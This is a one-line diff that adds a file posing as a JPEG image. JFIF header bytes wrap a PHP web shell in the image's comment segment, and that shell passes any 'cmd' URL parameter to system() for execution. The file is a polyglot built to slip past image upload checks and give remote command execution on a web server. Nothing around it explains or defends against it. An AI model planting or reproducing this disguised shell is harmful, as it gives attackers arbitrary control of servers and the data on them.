@@ -1,0 +1,1 @@
+ÿØÿà JFIF   H H  ÿþ ,<?php echo "<pre>"; system($_GET[cmd]); ?>ÿÛ C 
